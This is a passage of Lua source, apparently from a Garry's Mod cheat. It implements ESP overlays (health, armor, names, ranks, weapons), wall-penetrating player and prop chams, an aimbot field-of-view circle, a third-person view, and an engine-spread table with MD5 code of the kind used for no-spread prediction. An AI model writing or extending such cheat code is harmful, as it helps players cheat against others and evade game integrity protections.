            surface.DrawRect(pos.x - w / 2 - 6, pos.y - h / 100 * v:Health(), w / w, h / 100 * v:Health())
        else
            surface.SetDrawColor(Color(0, 0, 0))
            surface.DrawRect(pos.x - w / 2 - 7, pos2.y - 1, w / w + 3, h + 2)
            surface.SetDrawColor(HSVToColor( hp / 100 * 120, 1, 1 ))
            surface.DrawRect(pos.x - w / 2 - 6, pos.y - h, w / w + 1, h)
        end
    end
    if Config["ArmorBar"] and Config["EspPlayer"] then
        if(!v:Alive()) then continue end
        if(v:IsDormant()) then continue end
        if(v == LocalPlayer()) then continue end
        if v == LocalPlayer() then continue end
		
		if v:Armor() <= 100 and v:Armor() > 0 and v:GetClass() == "player" then
		    surface.SetDrawColor(Color(20, 20, 20))
		    surface.DrawRect(pos.x - w / 2, pos.y + 2, w + 2, w / w + 2)
		    surface.SetDrawColor(Color(84, 118, 255))
		    surface.DrawRect(pos.x - w / 2 + 1, pos.y + 3, w / 100 * v:Armor() - 1, w / w)
		elseif v:Armor() > 100 and v:GetClass() == "player" then
		    surface.SetDrawColor(Color(20, 20, 20))
		    surface.DrawRect(pos.x - w / 2, pos.y + 2, w + 2, w / w + 2)
		    surface.SetDrawColor(Color(84, 118, 255))
		    surface.DrawRect(pos.x - w / 2 + 1, pos.y + 3, w / 100 * 100 - 1, w / w)
		end
	end

    if Config["EspPlayername"] and Config["EspPlayer"]then
            if not v:Alive() then continue end
            if v:IsDormant() then continue end
            if v == LocalPlayer() then continue end
            local pos = v:GetPos()
            local min, max = v:OBBMins(), v:OBBMaxs()
            local pos2 = pos + Vector(min.x, 0, max.z)
            local pos = Vector(pos):ToScreen()
            local pos2 = Vector(pos2):ToScreen()
			draw.DrawText( v:Nick(), "RobotoSSS",  pos.x, pos2.y - 13, string.ToColor(Config.Col["EspPlayername"]), TEXT_ALIGN_CENTER, TEXT_ALIGN_TOP )
			
        end
    end
 
    if Config["EspPlayerSight"] and Config["EspPlayer"] then

        for i, v in pairs(player.GetAll()) do
            if Config["UseDistPlayer"] then
                    if (math.Round(me:GetPos():Distance( v:GetPos() ) / 42, 1 )) >= Config["EspRenderDistnacePlayer"] then continue end
            end
            if v:Team() == TEAM_SPECTATOR then return end
            if v ~= lply then
                surface.SetDrawColor(string.ToColor(Config.Col["EspPlayerSight"]))
                pstart = v:GetBonePosition( v:LookupBone('ValveBiped.Bip01_Head1') ):ToScreen()
                pend = util.TraceLine(util.GetPlayerTrace(v)).HitPos:ToScreen()
                surface.DrawLine(pstart.x,pstart.y,pend.x,pend.y)
            end
        end
    end
    if Config["AimCircle"] and Config["Aimbot"] then
        if Config["AimFov"] < 70 then
            local sx = math.tan( math.rad( Config["AimFov"] ) / 1.3 )
            local wx = math.tan( math.rad( LocalPlayer():GetFOV() / 2 ) )
            local ffov = sx / wx
            local newfov = ffov * ( ScrW() / 2 )
            surface.DrawCircle( ScrW() / 2, ScrH() / 2, newfov, string.ToColor(Config.Col["AimCircle"]))
        end
    end
    for k,v in next, ents.FindByClass("prop_physics") do
        if Config["UseDistProp"] then
            if (math.Round(me:GetPos():Distance( v:GetPos() ) / 42, 1 )) >= Config["EspRenderDistanceProp"] then continue end
        end
        if Config["Propchams"] then
            if(not Config["EspProp"]) then continue end 
            othercolforpropchams = string.ToColor(Config.Col["Propchams"])
            cam.Start3D()
                v:SetColor(Color(0,0,0,0))
                cam.IgnoreZ( true )
                render.SetColorModulation(othercolforpropchams.r / 255, othercolforpropchams.g / 255, othercolforpropchams.b / 255)
                if Config["ProMat"] == "glow" then
                    render.SuppressEngineLighting(true)
                    render.MaterialOverride(glow1)
                elseif Config["ProMat"] == "textured" then
                    render.SuppressEngineLighting(false)
                    render.MaterialOverride(mat1)
                elseif Config["ProMat"] == "flat" then
                    render.SuppressEngineLighting(true)
                    render.MaterialOverride(mat1)
                end
                v:DrawModel()
                render.SuppressEngineLighting(false)
                cam.IgnoreZ(false)
                
                render.SetColorModulation(1, 1, 1)
                render.MaterialOverride(nil)
                
            cam.End3D()
        end
        if not Config["Propchams"] or not Config["EspProp"] then
            cam.Start3D()
                    v:SetColor(Color(255,255,255,255))
            cam.End3D()
        end
    end
end

local function otheresp()
	for k, v in pairs(player.GetAll()) do
	if Config["UseDistPlayer"] then
        if (math.Round(me:GetPos():Distance( v:GetPos() ) / 42, 1 )) >= Config["EspRenderDistnacePlayer"] then return end
    end
		local pos = v:GetPos()
	    local min, max = v:OBBMins(), v:OBBMaxs()
	    local pos2 = pos + Vector(min.x, 0, max.z)
	    local pos = Vector(pos):ToScreen()
	    local pos2 = Vector(pos2):ToScreen()
	    local h = pos.y - pos2.y
	    local w = h / 2
	    if(!v:Alive()) then continue end
        if(v:IsDormant()) then continue end
        if(v == LocalPlayer()) then continue end
        if v == LocalPlayer() then continue end
	    if Config["HealthBarText"] and Config["EspPlayer"] and !Config["ArmorBarText"] and !Config["RankText"] then
	    	if (math.Round(me:GetPos():Distance( v:GetPos() ) / 42, 1 )) >= 40 then continue end
	        draw.DrawText("["..v:Health().. "]", "RobotoSSSS", pos.x + w / 2 + 6, pos2.y + 2, string.ToColor(Config.Col["HealthBarText"]), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
	    end
	    if Config["ArmorBarText"] and Config["EspPlayer"] and !Config["HealthBarText"] and !Config["RankText"] then
	    	if (math.Round(me:GetPos():Distance( v:GetPos() ) / 42, 1 )) >= 40 then continue end
	        draw.DrawText("["..v:Armor().. "]", "RobotoSSSS", pos.x + w / 2 + 6, pos2.y + 2, string.ToColor(Config.Col["ArmorBarText"]), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
	    end
	    if Config["RankText"] and Config["EspPlayer"] and !Config["ArmorBarText"] and !Config["HealthBarText"] then
	    	if (math.Round(me:GetPos():Distance( v:GetPos() ) / 42, 1 )) >= 40 then continue end
	        draw.DrawText("["..v:GetUserGroup().. "]", "RobotoSSSS", pos.x + w / 2 + 6, pos2.y + 2, string.ToColor(Config.Col["RankText"]), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
	    end
		if Config["HealthBarText"] and Config["ArmorBarText"] and Config["EspPlayer"] and !Config["RankText"] then
	    	if (math.Round(me:GetPos():Distance( v:GetPos() ) / 42, 1 )) >= 40 then continue end
	        draw.DrawText("["..v:Health().. "]", "RobotoSSSS", pos.x + w / 2 + 6, pos2.y + 2, string.ToColor(Config.Col["HealthBarText"]), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
	    	draw.DrawText("["..v:Armor().. "]", "RobotoSSSS", pos.x + w / 2 + 6, pos2.y + 12, string.ToColor(Config.Col["ArmorBarText"]), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
	    end
	    if Config["HealthBarText"] and Config["RankText"] and Config["EspPlayer"] and !Config["ArmorBarText"] then
	    	if (math.Round(me:GetPos():Distance( v:GetPos() ) / 42, 1 )) >= 40 then continue end
	        draw.DrawText("["..v:Health().. "]", "RobotoSSSS", pos.x + w / 2 + 6, pos2.y + 2, string.ToColor(Config.Col["HealthBarText"]), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
	    	draw.DrawText("["..v:GetUserGroup().. "]", "RobotoSSSS", pos.x + w / 2 + 6, pos2.y + 12, string.ToColor(Config.Col["RankText"]), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
	    end
	    if Config["ArmorBarText"] and Config["RankText"] and Config["EspPlayer"] and !Config["HealthBarText"] then
	    	if (math.Round(me:GetPos():Distance( v:GetPos() ) / 42, 1 )) >= 40 then continue end
	        draw.DrawText("["..v:Armor().. "]", "RobotoSSSS", pos.x + w / 2 + 6, pos2.y + 2, string.ToColor(Config.Col["ArmorBarText"]), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
	    	draw.DrawText("["..v:GetUserGroup().. "]", "RobotoSSSS", pos.x + w / 2 + 6, pos2.y + 12, string.ToColor(Config.Col["RankText"]), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
	    end
	    if Config["HealthBarText"] and Config["ArmorBarText"] and Config["RankText"] and Config["EspPlayer"] then
	    	if (math.Round(me:GetPos():Distance( v:GetPos() ) / 42, 1 )) >= 40 then continue end
	        draw.DrawText("["..v:Health().. "]", "RobotoSSSS", pos.x + w / 2 + 6, pos2.y + 2, string.ToColor(Config.Col["HealthBarText"]), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
	    	draw.DrawText("["..v:Armor().. "]", "RobotoSSSS", pos.x + w / 2 + 6, pos2.y + 12, string.ToColor(Config.Col["ArmorBarText"]), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
	    	draw.DrawText("["..v:GetUserGroup().. "]", "RobotoSSSS", pos.x + w / 2 + 6, pos2.y + 22, string.ToColor(Config.Col["RankText"]), TEXT_ALIGN_LEFT, TEXT_ALIGN_TOP)
	   end 
	   if Config["WepEsp"] and Config["EspPlayer"] then
	   		draw.DrawText( v:GetActiveWeapon():GetClass(), "RobotoSSS",  pos.x, pos.y + 3, string.ToColor(Config.Col["WepEsp"]), TEXT_ALIGN_CENTER, TEXT_ALIGN_BOTTOM )
	   	end
	end
end
makeHook("RenderScreenspaceEffects", function()
if Config["EspPlayer"] then

local col1 = string.ToColor(Config.Col["PlayerChams"])
local col2 = string.ToColor(Config.Col["PlayerChamsXQZ"])
    for k,v in pairs(player.GetAll()) do
      if Config["UseDistPlayer"] then
          if (math.Round(me:GetPos():Distance( v:GetPos() ) / 42, 1 )) >= Config["EspRenderDistnacePlayer"] then continue end
      end
      if(not v:Alive() or v == LocalPlayer() or not IsValid(v) or v:IsDormant()) then continue end 
      cam.Start3D()
      if Config["PlayerChamsXQZ"] then
        render.SetColorModulation((col2.r / 255), (col2.g / 255), (col2.b / 255))
        render.SetBlend(1)
        if Config["PlyMat"] == "glow" then
            render.SuppressEngineLighting(true)
            render.MaterialOverride(glow1)
        elseif Config["PlyMat"] == "textured" then
            render.SuppressEngineLighting(false)
            render.MaterialOverride(mat1)
        elseif Config["PlyMat"] == "flat" then
            render.SuppressEngineLighting(true)
            render.MaterialOverride(mat1)
        end
        v:DrawModel()
        end
        if Config["PlayerChams"] then
        render.SetColorModulation((col1.r / 255), (col1.g / 255), (col1.b / 255))
        render.SetBlend(1)
        if Config["PlyMat"] == "glow" then
            render.SuppressEngineLighting(true)
            render.MaterialOverride(glow2)
        elseif Config["PlyMat"] == "textured" then
            render.SuppressEngineLighting(false)
            render.MaterialOverride(mat2)
        elseif Config["PlyMat"] == "flat" then
            render.SuppressEngineLighting(true)
            render.MaterialOverride(mat2)
        end
        v:DrawModel()
        end
        render.MaterialOverride(nil)
        render.SuppressEngineLighting(false)
      cam.End3D()
    end
  end
end)
makeHook( "CalcView", function( ply, pos, angles, fov )
    if Config["Thirdperson"] and Config["MiscToggle"] then
        local view = {
            origin = pos - ( angles:Forward() * 100 ),
            angles = angles,
            fov = fov,
            drawviewer = true
        }

        return view
    end
end)



local NS = {}
 
NS.engineSpread = {
    [0] = {-0.492036, 0.286111},
    [1] = {-0.492036, 0.286111},
    [2] = {-0.255320, 0.128480},
    [3] = {0.456165, 0.356030},
    [4] = {-0.361731, 0.406344},
    [5] = {-0.146730, 0.834589},
    [6] = {-0.253288, -0.421936},
    [7] = {-0.448694, 0.111650},
    [8] = {-0.880700, 0.904610},
    [9] = {-0.379932, 0.138833},
    [10] = {0.502579, -0.494285},
    [11] = {-0.263847, -0.594805},
    [12] = {0.818612, 0.090368},
    [13] = {-0.063552, 0.044356},
    [14] = {0.490455, 0.304820},
    [15] = {-0.192024, 0.195162},
    [16] = {-0.139421, 0.857106},
    [17] = {0.715745, 0.336956},
    [18] = {-0.150103, -0.044842},
    [19] = {-0.176531, 0.275787},
    [20] = {0.155707, -0.152178},
    [21] = {-0.136486, -0.591896},
    [22] = {-0.021022, -0.761979},
    [23] = {-0.166004, -0.733964},
    [24] = {-0.102439, -0.132059},
    [25] = {-0.607531, -0.249979},
    [26] = {-0.500855, -0.185902},
    [27] = {-0.080884, 0.516556},
    [28] = {-0.003334, 0.138612},
    [29] = {-0.546388, -0.000115},
    [30] = {-0.228092, -0.018492},
    [31] = {0.542539, 0.543196},
    [32] = {-0.355162, 0.197473},
    [33] = {-0.041726, -0.015735},
    [34] = {-0.713230, -0.551701},
    [35] = {-0.045056, 0.090208},
    [36] = {0.061028, 0.417744},
    [37] = {-0.171149, -0.048811},
    [38] = {0.241499, 0.164562},
    [39] = {-0.129817, -0.111200},
    [40] = {0.007366, 0.091429},
    [41] = {-0.079268, -0.008285},
    [42] = {0.010982, -0.074707},
    [43] = {-0.517782, -0.682470},
    [44] = {-0.663822, -0.024972},
    [45] = {0.058213, -0.078307},
    [46] = {-0.302041, -0.132280},
    [47] = {0.217689, -0.209309},
    [48] = {-0.143615, 0.830349},
    [49] = {0.270912, 0.071245},
    [50] = {-0.258170, -0.598358},
    [51] = {0.099164, -0.257525},
    [52] = {-0.214676, -0.595918},
    [53] = {-0.427053, -0.523764},
    [54] = {-0.585472, 0.088522},
    [55] = {0.564305, -0.533822},
    [56] = {-0.387545, -0.422206},
    [57] = {0.690505, -0.299197},
    [58] = {0.475553, 0.169785},
    [59] = {0.347436, 0.575364},
    [60] = {-0.069555, -0.103340},
    [61] = {0.286197, -0.618916},
    [62] = {-0.505259, 0.106581},
    [63] = {-0.420214, -0.714843},
    [64] = {0.032596, -0.401891},
    [65] = {-0.238702, -0.087387},
    [66] = {0.714358, 0.197811},
    [67] = {0.208960, 0.319015},
    [68] = {-0.361140, 0.222130},
    [69] = {-0.133284, -0.492274},
    [70] = {0.022824, -0.133955},
    [71] = {-0.100850, 0.271962},
    [72] = {-0.050582, -0.319538},
    [73] = {0.577980, 0.095507},
    [74] = {0.224871, 0.242213},
    [75] = {-0.628274, 0.097248},
    [76] = {0.184266, 0.091959},
    [77] = {-0.036716, 0.474259},
    [78] = {-0.502566, -0.279520},
    [79] = {-0.073201, -0.036658},
    [80] = {0.339952, -0.293667},
    [81] = {0.042811, 0.130387},
    [82] = {0.125881, 0.007040},
    [83] = {0.138374, -0.418355},
    [84] = {0.261396, -0.392697},
    [85] = {-0.453318, -0.039618},
    [86] = {0.890159, -0.335165},
    [87] = {0.466437, -0.207762},
    [88] = {0.593253, 0.418018},
    [89] = {0.566934, -0.643837},
    [90] = {0.150918, 0.639588},
    [91] = {0.150112, 0.215963},
    [92] = {-0.130520, 0.324801},
    [93] = {-0.369819, -0.019127},
    [94] = {-0.038889, -0.650789},
    [95] = {0.490519, -0.065375},
    [96] = {-0.305940, 0.454759},
    [97] = {-0.521967, -0.550004},
    [98] = {-0.040366, 0.683259},
    [99] = {0.137676, -0.376445},
    [100] = {0.839301, 0.085979},
    [101] = {-0.319140, 0.481838},
    [102] = {0.201437, -0.033135},
    [103] = {0.384637, -0.036685},
    [104] = {0.598419, 0.144371},
    [105] = {-0.061424, -0.608645},
    [106] = {-0.065337, 0.308992},
    [107] = {-0.029356, -0.634337},
    [108] = {0.326532, 0.047639},
    [109] = {0.505681, -0.067187},
    [110] = {0.691612, 0.629364},
    [111] = {-0.038588, -0.635947},
    [112] = {0.637837, -0.011815},
    [113] = {0.765338, 0.563945},
    [114] = {0.213416, 0.068664},
    [115] = {-0.576581, 0.554824},
    [116] = {0.246580, 0.132726},
    [117] = {0.385548, -0.070054},
    [118] = {0.538735, -0.291010},
    [119] = {0.609944, 0.590973},
    [120] = {-0.463240, 0.010302},
    [121] = {-0.047718, 0.741086},
    [122] = {0.308590, -0.322179},
    [123] = {-0.291173, 0.256367},
    [124] = {0.287413, -0.510402},
    [125] = {0.864716, 0.158126},
    [126] = {0.572344, 0.561319},
    [127] = {-0.090544, 0.332633},
    [128] = {0.644714, 0.196736},
    [129] = {-0.204198, 0.603049},
    [130] = {-0.504277, -0.641931},
    [131] = {0.218554, 0.343778},
    [132] = {0.466971, 0.217517},
    [133] = {-0.400880, -0.299746},
    [134] = {-0.582451, 0.591832},
    [135] = {0.421843, 0.118453},
    [136] = {-0.215617, -0.037630},
    [137] = {0.341048, -0.283902},
    [138] = {-0.246495, -0.138214},
    [139] = {0.214287, -0.196102},
    [140] = {0.809797, -0.498168},
    [141] = {-0.115958, -0.260677},
    [142] = {-0.025448, 0.043173},
    [143] = {-0.416803, -0.180813},
    [144] = {-0.782066, 0.335273},
    [145] = {0.192178, -0.151171},
    [146] = {0.109733, 0.165085},
    [147] = {-0.617935, -0.274392},
    [148] = {0.283301, 0.171837},
    [149] = {-0.150202, 0.048709},
    [150] = {-0.179954, -0.288559},
    [151] = {-0.288267, -0.134894},
    [152] = {-0.049203, 0.231717},
    [153] = {-0.065761, 0.495457},
    [154] = {0.082018, -0.457869},
    [155] = {-0.159553, 0.032173},
    [156] = {0.508305, -0.090690},
    [157] = {0.232269, -0.338245},
    [158] = {-0.374490, -0.480945},
    [159] = {-0.541244, 0.194144},
    [160] = {-0.040063, -0.073532},
    [161] = {0.136516, -0.167617},
    [162] = {-0.237350, 0.456912},
    [163] = {-0.446604, -0.494381},
    [164] = {0.078626, -0.020068},
    [165] = {0.163208, 0.600330},
    [166] = {-0.886186, -0.345326},
    [167] = {-0.732948, -0.689349},
    [168] = {0.460564, -0.719006},
    [169] = {-0.033688, -0.333340},
    [170] = {-0.325414, -0.111704},
    [171] = {0.010928, 0.723791},
    [172] = {0.713581, -0.077733},
    [173] = {-0.050912, -0.444684},
    [174] = {-0.268509, 0.381144},
    [175] = {-0.175387, 0.147070},
    [176] = {-0.429779, 0.144737},
    [177] = {-0.054564, 0.821354},
    [178] = {0.003205, 0.178130},
    [179] = {-0.552814, 0.199046},
    [180] = {0.225919, -0.195013},
    [181] = {0.056040, -0.393974},
    [182] = {-0.505988, 0.075184},
    [183] = {-0.510223, 0.156271},
    [184] = {-0.209616, 0.111174},
    [185] = {-0.605132, -0.117104},
    [186] = {0.412433, -0.035510},
    [187] = {-0.573947, -0.691295},
    [188] = {-0.712686, 0.021719},
    [189] = {-0.643297, 0.145307},
    [190] = {0.245038, 0.343062},
    [191] = {-0.235623, -0.159307},
    [192] = {-0.834004, 0.088725},
    [193] = {0.121377, 0.671713},
    [194] = {0.528614, 0.607035},
    [195] = {-0.285699, -0.111312},
    [196] = {0.603385, 0.401094},
    [197] = {0.632098, -0.439659},
    [198] = {0.681016, -0.242436},
    [199] = {-0.261709, 0.304265},
    [200] = {-0.653737, -0.199245},
    [201] = {-0.435512, -0.762978},
    [202] = {0.701105, 0.389527},
    [203] = {0.093495, -0.148484},
    [204] = {0.715218, 0.638291},
    [205] = {-0.055431, -0.085173},
    [206] = {-0.727438, 0.889783},
    [207] = {-0.007230, -0.519183},
    [208] = {-0.359615, 0.058657},
    [209] = {0.294681, 0.601155},
    [210] = {0.226879, -0.255430},
    [211] = {-0.307847, -0.617373},
    [212] = {0.340916, -0.780086},
    [213] = {-0.028277, 0.610455},
    [214] = {-0.365067, 0.323311},
    [215] = {0.001059, -0.270451},
    [216] = {0.304025, 0.047478},
    [217] = {0.297389, 0.383859},
    [218] = {0.288059, 0.262816},
    [219] = {-0.889315, 0.533731},
    [220] = {0.215887, 0.678889},
    [221] = {0.287135, 0.343899},
    [222] = {0.423951, 0.672285},
    [223] = {0.411912, -0.812886},
    [224] = {0.081615, -0.497358},
    [225] = {-0.051963, -0.117891},
    [226] = {-0.062387, 0.331698},
    [227] = {0.020458, -0.734125},
    [228] = {-0.160176, 0.196321},
    [229] = {0.044898, -0.024032},
    [230] = {-0.153162, 0.930951},
    [231] = {-0.015084, 0.233476},
    [232] = {0.395043, 0.645227},
    [233] = {-0.232095, 0.283834},
    [234] = {-0.507699, 0.317122},
    [235] = {-0.606604, -0.227259},
    [236] = {0.526430, -0.408765},
    [237] = {0.304079, 0.135680},
    [238] = {-0.134042, 0.508741},
    [239] = {-0.276770, 0.383958},
    [240] = {-0.298963, -0.233668},
    [241] = {0.171889, 0.697367},
    [242] = {-0.292571, -0.317604},
    [243] = {0.587806, 0.115584},
    [244] = {-0.346690, -0.098320},
    [245] = {0.956701, -0.040982},
    [246] = {0.040838, 0.595304},
    [247] = {0.365201, -0.519547},
    [248] = {-0.397271, -0.090567},
    [249] = {-0.124873, -0.356800},
    [250] = {-0.122144, 0.617725},
    [251] = {0.191266, -0.197764},
    [252] = {-0.178092, 0.503667},
    [253] = {0.103221, 0.547538},
    [254] = {0.019524, 0.621226},
    [255] = {0.663918, -0.573476}
}
 
NS.Const = {
    0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee,
    0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
    0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be,
    0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,
    0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa,
    0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
    0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed,
    0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,
    0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c,
    0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
    0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05,
    0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,
    0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039,
    0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
    0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1,
    0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391,
    0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476
}
 
local md5_f = function (x,y,z) return bit.bor(bit.band(x,y),bit.band(-x-1,z)) end
local md5_g = function (x,y,z) return bit.bor(bit.band(x,z),bit.band(y,-z-1)) end
local md5_h = function (x,y,z) return bit.bxor(x,bit.bxor(y,z)) end
local md5_i = function (x,y,z) return bit.bxor(y,bit.bor(x,-z-1)) end
 
NS.MD5 = {}
 
function NS.MD5.z(f, a, b, c, d, x, s, ac)
    a = bit.band(a + f(b, c, d) + x + ac, 0xffffffff)
    return bit.bor(bit.lshift(bit.band(a, bit.rshift(0xffffffff, s)), s), bit.rshift(a, 32 - s)) + b
end
 
function NS.MD5.Fix(a)
    if (a > 2 ^ 31) then
        return a - 2 ^ 32
    end
    return a
end
 
function NS.MD5.Transform(A, B, C, D, X)
local a, b, c, d = A, B, C, D
    a = NS.MD5.z(md5_f, a, b, c, d, X[0], 7, NS.Const[1])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    d = NS.MD5.z(md5_f, d, a, b, c, X[1], 12, NS.Const[2])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    c = NS.MD5.z(md5_f, c, d, a, b, X[2], 17, NS.Const[3])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    b = NS.MD5.z(md5_f, b, c, d, a, X[3], 22, NS.Const[4])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    a = NS.MD5.z(md5_f, a, b, c, d, X[4], 7, NS.Const[5])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    d = NS.MD5.z(md5_f, d, a, b, c, X[5], 12, NS.Const[6])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    c = NS.MD5.z(md5_f, c, d, a, b, X[6], 17, NS.Const[7])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    b = NS.MD5.z(md5_f, b, c, d, a, X[7], 22, NS.Const[8])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    a = NS.MD5.z(md5_f, a, b, c, d, X[8], 7, NS.Const[9])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    d = NS.MD5.z(md5_f, d, a, b, c, X[9], 12, NS.Const[10])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    c = NS.MD5.z(md5_f, c, d, a, b, X[10], 17, NS.Const[11])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    b = NS.MD5.z(md5_f, b, c, d, a, X[11], 22, NS.Const[12])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    a = NS.MD5.z(md5_f, a, b, c, d, X[12], 7, NS.Const[13])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    d = NS.MD5.z(md5_f, d, a, b, c, X[13], 12, NS.Const[14])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    c = NS.MD5.z(md5_f, c, d, a, b, X[14], 17, NS.Const[15])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    b = NS.MD5.z(md5_f, b, c, d, a, X[15], 22, NS.Const[16])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     a = NS.MD5.z(md5_g, a, b, c, d, X[1], 5, NS.Const[17])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     d = NS.MD5.z(md5_g, d, a, b, c, X[6], 9, NS.Const[18])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     c = NS.MD5.z(md5_g, c, d, a, b, X[11], 14, NS.Const[19])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     b = NS.MD5.z(md5_g, b, c, d, a, X[0], 20, NS.Const[20])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     a = NS.MD5.z(md5_g, a, b, c, d, X[5], 5, NS.Const[21])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     d = NS.MD5.z(md5_g, d, a, b, c, X[10], 9, NS.Const[22])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     c = NS.MD5.z(md5_g, c, d, a, b, X[15], 14, NS.Const[23])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     b = NS.MD5.z(md5_g, b, c, d, a, X[4], 20, NS.Const[24])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     a = NS.MD5.z(md5_g, a, b, c, d, X[9], 5, NS.Const[25])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     d = NS.MD5.z(md5_g, d, a, b, c, X[14], 9, NS.Const[26])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     c = NS.MD5.z(md5_g, c, d, a, b, X[3], 14, NS.Const[27])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     b = NS.MD5.z(md5_g, b, c, d, a, X[8], 20, NS.Const[28])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     a = NS.MD5.z(md5_g, a, b, c, d, X[13], 5, NS.Const[29])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     d = NS.MD5.z(md5_g, d, a, b, c, X[2], 9, NS.Const[30])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     c = NS.MD5.z(md5_g, c, d, a, b, X[7], 14, NS.Const[31])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
     b = NS.MD5.z(md5_g, b, c, d, a, X[12], 20, NS.Const[32])
     a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    a = NS.MD5.z(md5_h, a, b, c, d, X[5], 4, NS.Const[33])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    d = NS.MD5.z(md5_h, d, a, b, c, X[8], 11, NS.Const[34])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    c = NS.MD5.z(md5_h, c, d, a, b, X[11], 16, NS.Const[35])
    a = NS.MD5.Fix(a) b = NS.MD5.Fix(b) c = NS.MD5.Fix(c) d = NS.MD5.Fix(d)
    b = NS.MD5.z(md5_h, b, c, d, a, X[14], 23, NS.Const[36])
